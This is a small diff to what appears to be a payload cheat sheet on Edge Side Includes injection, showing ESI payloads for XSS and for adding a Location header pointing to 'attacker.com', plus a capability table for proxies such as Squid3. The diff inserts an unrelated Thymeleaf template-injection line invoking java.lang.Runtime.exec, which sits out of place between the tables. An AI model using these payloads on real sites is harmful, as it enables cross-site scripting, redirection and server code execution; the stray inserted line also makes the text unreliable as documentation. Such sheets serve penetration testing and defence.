@@ -45,6 +45,8 @@ Surrogate-Control: content="ESI/1.0"
 | Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
 | Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
+<p th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('')}">vcs</p>
+
 | Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
 | -------- | -------- | ---- | ------- | ------------------------- | -------------- |
 | Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
